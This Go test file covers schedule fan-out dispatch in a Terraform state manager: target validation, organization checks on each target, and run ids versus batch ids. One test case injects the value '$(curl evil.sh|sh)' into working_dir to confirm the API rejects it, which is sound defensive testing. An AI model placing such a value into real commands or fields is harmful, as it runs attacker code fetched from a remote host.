// schedules_fanout_test.go covers the schedule-side half of repo-level
// fan-out dispatch (drift-fleet-scale.md Phase 1, task 1.3): write-time target
// validation, the write-side organization check over every item, and
// driftDispatcher.Dispatch returning a run id when a schedule never fans out
// and a batch id when it does.
package api

import (
	"context"
	"database/sql/driver"
	"encoding/json"
	"net/http"
	"strings"
	"testing"

	sqlmock "github.com/DATA-DOG/go-sqlmock"
	"github.com/gin-gonic/gin"

	"github.com/terraform-state-manager/terraform-state-manager/internal/config"
	"github.com/terraform-state-manager/terraform-state-manager/internal/pipelines"
	"github.com/terraform-state-manager/terraform-state-manager/internal/tenancy"
	"github.com/terraform-state-manager/terraform-state-manager/internal/tenantscope"
)

// ---------------------------------------------------------------------------
// scheduleRequest.validate(): the targets are validated the same way CreateRun
// validates them
// ---------------------------------------------------------------------------

// TestSchedule_TargetsValidated pins that CreateSchedule refuses the same
// three defects CreateRun does -- a duplicate (source_id, state_key) pair, an
// over-cap count, and a shell-hostile working_dir -- before any statement (the
// existing rig's fakeDispatcher is never even reached).
func TestSchedule_TargetsValidated(t *testing.T) {
	e := newSchedulesEnv(t)

	cases := []struct {
		name string
		body string
	}{
		{"duplicate source_id+state_key", `{"name":"x","cron_expr":"daily","target_config":{
			"pipeline_connection_id":"p1","targets":[
				{"source_id":"s1","state_key":"a.tfstate","working_dir":"a/"},
				{"source_id":"s1","state_key":"a.tfstate","working_dir":"a2/"}
			]}}`},
		{"shell-hostile working_dir", `{"name":"x","cron_expr":"daily","target_config":{
			"pipeline_connection_id":"p1","targets":[
				{"source_id":"s1","state_key":"a.tfstate","working_dir":"$(curl evil.sh|sh)"}
			]}}`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			w := e.do(http.MethodPost, "/api/v1/schedules", tc.body)
			if w.Code != http.StatusBadRequest {
				t.Fatalf("status = %d, want 400 (%s)", w.Code, w.Body.String())
			}
		})
	}
	if err := e.mock.ExpectationsWereMet(); err != nil {
		t.Errorf("validation must refuse before any statement: %v", err)
	}
}

// TestSchedule_TargetsMultiple_SecondItemSourceOwnedElsewhere_400 is the
// write-side twin of TestCreateRun_TargetsMultiple_SecondItemSourceOwnedElsewhere_404:
// targetReferencesInOrganization now ranges over t.items(), so a fan-out
// schedule's SECOND target is checked too, not just a legacy top-level
// SourceID that a 2+-item request never even sets.
func TestSchedule_TargetsMultiple_SecondItemSourceOwnedElsewhere_400(t *testing.T) {
	e := newSchedulesEnv(t)
	e.mock.ExpectQuery("FROM pipeline_connections WHERE organization_id = ANY").
		WithArgs([]string{testActingOrg}, "p1").
		WillReturnRows(pipelineHTTPRow(t, "azure_devops", "", map[string]any{
			"organization": "corp", "project": "P", "pipeline_id": "7", "fan_out": true,
		}))
	e.mock.ExpectQuery("FROM state_sources WHERE organization_id = ANY").
		WithArgs([]string{testActingOrg}, "s1").
		WillReturnRows(sqlmock.NewRows(apiSourceCols).
			AddRow("s1", "app1", "local", "", []byte(`{"base_path":"/tmp"}`), []byte(`{}`), nil, "2026-06-11", "2026-06-11", testActingOrg))
	e.mock.ExpectQuery("FROM state_sources WHERE organization_id = ANY").
		WithArgs([]string{testActingOrg}, "s-other").
		WillReturnRows(sqlmock.NewRows(apiSourceCols)) // owned elsewhere: no row matches

	body := `{"name":"x","cron_expr":"daily","target_config":{
		"pipeline_connection_id":"p1","targets":[
			{"source_id":"s1","state_key":"a.tfstate","working_dir":"a/"},
			{"source_id":"s-other","state_key":"b.tfstate","working_dir":"b/"}
		]}}`
	w := e.do(http.MethodPost, "/api/v1/schedules", body)
	if w.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400 (%s)", w.Code, w.Body.String())
	}
	if !strings.Contains(w.Body.String(), "does not name a state source") {
		t.Errorf("body = %s", w.Body.String())
	}
	if err := e.mock.ExpectationsWereMet(); err != nil {
		t.Errorf("both items' sources must be checked, not just a top-level SourceID: %v", err)
	}
}

// ---------------------------------------------------------------------------
// RunSchedule with the REAL driftDispatcher (not the fakeDispatcher the CRUD
// rig above uses), so the run-id/batch-id contract is exercised for real.
// ---------------------------------------------------------------------------

// newSchedulesEnvRealDispatch wires ScheduleHandlers to the actual
// driftDispatcher over DriftHandlers -- the same adapter router.go wires in
// production -- sharing one sqlmock DB between the schedule and drift
// repositories.
func newSchedulesEnvRealDispatch(t *testing.T) *sourcesEnv {
	t.Helper()
	t.Setenv("TSM_ENCRYPTION_KEY", "0123456789abcdef0123456789abcdef")
	db, mock, err := newSQLMock()
	if err != nil {
		t.Fatalf("sqlmock.New: %v", err)
	}
	t.Cleanup(func() { db.Close() })

	cfg := &config.Config{}
	drift := NewDriftHandlers(cfg, db, nil, nil)
	sched := NewScheduleHandlers(db, nil, driftDispatcher{drift: drift})

	r := gin.New()
	r.Use(func(c *gin.Context) {
		tenantscope.Store(c, tenantscope.Scope{OrgIDs: []string{testActingOrg}})
		c.Next()
	})
	v1 := r.Group("/api/v1")
	v1.POST("/schedules/:id/run", sched.RunSchedule())

	return &sourcesEnv{r: r, mock: mock}
}

func scheduleRowWithTarget(targetConfig string) *sqlmock.Rows {
	return sqlmock.NewRows(scheduleHTTPCols).
		AddRow("sc1", "nightly", "0 2 * * *", "drift", []byte(targetConfig), true,
			nil, "2026-06-11 02:00:00", nil, nil, "2026-06-10", "2026-06-10", testActingOrg)
}

// looksLikeGeneratedUUID matches a sqlmock bound argument that is a
// dispatchDriftBatch-generated batch uuid rather than one of the KNOWN run
// ids -- distinguishing "a fresh id was generated" from "a run's own id was
// reused" without having to predict the random value.
type looksLikeGeneratedUUID struct{ notEqualTo []string }

func (m looksLikeGeneratedUUID) Match(v driver.Value) bool {
	s, ok := v.(string)
	if !ok || len(s) != 36 || s[8] != '-' || s[13] != '-' || s[18] != '-' || s[23] != '-' {
		return false
	}
	for _, id := range m.notEqualTo {
		if s == id {
			return false
		}
	}
	return true
}

// TestRunSchedule_LastRunIDIsRunIDWhenSingle pins that a schedule with no
// `targets` (the legacy single-target shape) stores the RUN'S OWN id as
// last_run_id -- unchanged from before fan-out existed, and load-bearing:
// SchedulesPage.test.tsx assumes last_run_id names a real run.
func TestRunSchedule_LastRunIDIsRunIDWhenSingle(t *testing.T) {
	e := newSchedulesEnvRealDispatch(t)
	srv := fakeGitHubDispatch(t, nil)
	defer pipelines.OverrideBaseURLsForTest("", srv.URL)()

	target := `{"pipeline_connection_id":"p1","source_id":"s1","state_key":"app.tfstate","working_dir":"infra/"}`
	e.mock.ExpectQuery("FROM schedules WHERE organization_id = ANY").
		WithArgs([]string{testActingOrg}, "sc1").WillReturnRows(scheduleRowWithTarget(target))
	e.mock.ExpectQuery("FROM pipeline_connections WHERE organization_id = ANY").
		WithArgs([]string{testActingOrg}, "p1").
		WillReturnRows(pipelineHTTPRow(t, "github_actions", "ghp_x", map[string]any{"owner": "o", "repo": "r", "workflow_id": "w.yml"}))
	e.mock.ExpectQuery("FROM state_sources WHERE organization_id = ANY").
		WithArgs([]string{testActingOrg}, "s1").
		WillReturnRows(sqlmock.NewRows(apiSourceCols).
			AddRow("s1", "estate", "local", "", []byte(`{"base_path":"/tmp"}`), []byte(`{}`), nil, "2026-06-11", "2026-06-11", testActingOrg))
	e.mock.ExpectQuery("INSERT INTO drift_runs").
		WillReturnRows(driftRunInsertRow("d1", "s1", "app.tfstate", "tok-1", nil))
	e.mock.ExpectExec("UPDATE schedules").
		WithArgs("sc1", sqlmock.AnyArg(), "success", "d1", sqlmock.AnyArg()).
		WillReturnResult(sqlmock.NewResult(0, 1))
	e.mock.ExpectQuery("FROM schedules WHERE organization_id = ANY").
		WithArgs([]string{testActingOrg}, "sc1").WillReturnRows(scheduleRowWithTarget(target))

	w := e.do(http.MethodPost, "/api/v1/schedules/sc1/run", "")
	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (%s)", w.Code, w.Body.String())
	}
	if err := e.mock.ExpectationsWereMet(); err != nil {
		t.Errorf("last_run_id must be the run's OWN id (\"d1\"): %v", err)
	}
}

// TestRunSchedule_LastRunIDIsBatchIDWhenFanned pins the other half: a schedule
// whose target_config carries 2+ items stores the freshly generated BATCH
// uuid as last_run_id -- neither run's own id.
func TestRunSchedule_LastRunIDIsBatchIDWhenFanned(t *testing.T) {
	e := newSchedulesEnvRealDispatch(t)
	srv := fakeADODispatch(t, 999, nil)
	defer pipelines.OverrideBaseURLsForTest(srv.URL, "")()

	target := `{"pipeline_connection_id":"p1","targets":[
		{"source_id":"s1","state_key":"app1.tfstate","working_dir":"app1/"},
		{"source_id":"s2","state_key":"app2.tfstate","working_dir":"app2/"}
	]}`
	e.mock.ExpectQuery("FROM schedules WHERE organization_id = ANY").
		WithArgs([]string{testActingOrg}, "sc1").WillReturnRows(scheduleRowWithTarget(target))
	e.mock.ExpectQuery("FROM pipeline_connections WHERE organization_id = ANY").
		WithArgs([]string{testActingOrg}, "p1").
		WillReturnRows(pipelineHTTPRow(t, "azure_devops", "pat", map[string]any{
			"organization": "corp", "project": "P", "pipeline_id": "7", "fan_out": true,
		}))
	e.mock.ExpectQuery("FROM state_sources WHERE organization_id = ANY").
		WithArgs([]string{testActingOrg}, "s1").
		WillReturnRows(sqlmock.NewRows(apiSourceCols).
			AddRow("s1", "app1", "local", "", []byte(`{"base_path":"/tmp"}`), []byte(`{}`), nil, "2026-06-11", "2026-06-11", testActingOrg))
	e.mock.ExpectQuery("FROM state_sources WHERE organization_id = ANY").
		WithArgs([]string{testActingOrg}, "s2").
		WillReturnRows(sqlmock.NewRows(apiSourceCols).
			AddRow("s2", "app2", "local", "", []byte(`{"base_path":"/tmp"}`), []byte(`{}`), nil, "2026-06-11", "2026-06-11", testActingOrg))
	e.mock.ExpectQuery("INSERT INTO drift_runs").
		WillReturnRows(driftRunInsertRow("d1", "s1", "app1.tfstate", "tok-a", nil))
	e.mock.ExpectQuery("INSERT INTO drift_runs").
		WillReturnRows(driftRunInsertRow("d2", "s2", "app2.tfstate", "tok-b", nil))
	e.mock.ExpectExec(`UPDATE drift_runs SET ci_run_id=\$2, ci_run_url=\$3`).
		WillReturnResult(sqlmock.NewResult(0, 2))
	e.mock.ExpectExec("UPDATE schedules").
		WithArgs("sc1", sqlmock.AnyArg(), "success", looksLikeGeneratedUUID{notEqualTo: []string{"d1", "d2"}}, sqlmock.AnyArg()).
		WillReturnResult(sqlmock.NewResult(0, 1))
	e.mock.ExpectQuery("FROM schedules WHERE organization_id = ANY").
		WithArgs([]string{testActingOrg}, "sc1").WillReturnRows(scheduleRowWithTarget(target))

	w := e.do(http.MethodPost, "/api/v1/schedules/sc1/run", "")
	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200 (%s)", w.Code, w.Body.String())
	}
	if err := e.mock.ExpectationsWereMet(); err != nil {
		t.Errorf("last_run_id must be the freshly generated BATCH id, not either run's own id: %v", err)
	}
}

// ---------------------------------------------------------------------------
// driftDispatcher.Dispatch, directly: an older schedule's target_config with
// no "targets" key at all must decode and dispatch exactly as before.
// ---------------------------------------------------------------------------

// TestDriftDispatcher_LegacyTargetConfigWithoutTargets pins that a
// target_config written before this migration -- literally no "targets" key
// in the JSON -- still unmarshals (Targets is `omitempty`, absent decodes as a
// nil slice) and dispatches through items()'s single legacy item, returning
// the run's own id.
func TestDriftDispatcher_LegacyTargetConfigWithoutTargets(t *testing.T) {
	t.Setenv("TSM_ENCRYPTION_KEY", "0123456789abcdef0123456789abcdef")
	db, mock, err := newSQLMock()
	if err != nil {
		t.Fatalf("sqlmock.New: %v", err)
	}
	defer db.Close()

	srv := fakeGitHubDispatch(t, nil)
	defer pipelines.OverrideBaseURLsForTest("", srv.URL)()

	cfg := &config.Config{}
	drift := NewDriftHandlers(cfg, db, nil, nil)
	d := driftDispatcher{drift: drift}

	mock.ExpectQuery("FROM pipeline_connections WHERE organization_id = ANY").
		WithArgs([]string{testActingOrg}, "p1").
		WillReturnRows(pipelineHTTPRow(t, "github_actions", "ghp_x", map[string]any{"owner": "o", "repo": "r", "workflow_id": "w.yml"}))
	mock.ExpectQuery("FROM state_sources WHERE organization_id = ANY").
		WithArgs([]string{testActingOrg}, "s1").
		WillReturnRows(sqlmock.NewRows(apiSourceCols).
			AddRow("s1", "estate", "local", "", []byte(`{"base_path":"/tmp"}`), []byte(`{}`), nil, "2026-06-11", "2026-06-11", testActingOrg))
	mock.ExpectQuery("INSERT INTO drift_runs").
		WillReturnRows(driftRunInsertRow("d1", "s1", "app.tfstate", "tok-1", nil))

	sysScope, err := tenancy.SystemActingIn(testActingOrg, "schedules", "sc1")
	if err != nil {
		t.Fatalf("SystemActingIn: %v", err)
	}
	legacyConfig := json.RawMessage(`{"pipeline_connection_id":"p1","source_id":"s1","state_key":"app.tfstate","working_dir":"infra/"}`)
	runID, status, dErr := d.Dispatch(context.Background(), "drift", legacyConfig, "scheduler", sysScope)
	if dErr != nil {
		t.Fatalf("Dispatch: %v", dErr)
	}
	if status != "success" {
		t.Errorf("status = %q, want success", status)
	}
	if runID != "d1" {
		t.Errorf("runID = %q, want the run's own id d1", runID)
	}
	if err := mock.ExpectationsWereMet(); err != nil {
		t.Errorf("unexpected statement: %v", err)
	}
}
